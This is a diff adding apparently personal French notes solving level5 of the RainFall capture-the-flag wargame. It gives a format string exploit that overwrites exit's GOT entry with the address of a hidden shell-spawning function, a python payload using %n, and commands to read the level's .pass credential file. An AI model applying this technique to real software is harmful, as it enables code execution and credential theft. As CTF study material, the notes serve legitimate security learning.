@@ -1,0 +1,39 @@
+
+1. gdb level5 / info function / disass main / disass n
+2. Il y a un printf dans n donc on va utliser la technique de stirng attack, il y a aussi un fonction non utlise <o> on va la Global offset table pour remplace remplacer le call d'exit par un appelle a la fonction o qui elle fait un appelle sur /bin/sh
+3. objdump -d -> trouver l'addresse d'exit. / disas o -> trouver l'addresse de o. 0x080484a4
+5. level5@RainFall:~$ ./level5
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %p %p %p %p %p %p
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x41414141 0x41414141
+
+	l'offset est de 4
+4. python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /tmp/level5
+						^					^		^
+						|					|		|--------------------
+					exit address		o address (from n etc...)		|
+																	offset (4th on stacks)
+5. cat /tmp/level5 - | ./level5
+6. cat /home/user/level5/.pass
+
+
+
+
+
+<!-- 
+
+cette fois ci, on va modifier la Global offset table, pour remplacer l'address d'exit par la fonction o, qui est presente mais non appeler !
+
+objdump -d -> trouver l'addresse d'exit.
+disas o -> trouver l'addresse de o.
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /tmp/toto
+						^					^		^
+						|					|		|--------------------
+					exit address		o address (from n etc...)		|
+																	offset (4th on stacks)
+
+cat /tmp/toto - | level5
+...
+...
+...
+cat /home/user/level5/.pass -->
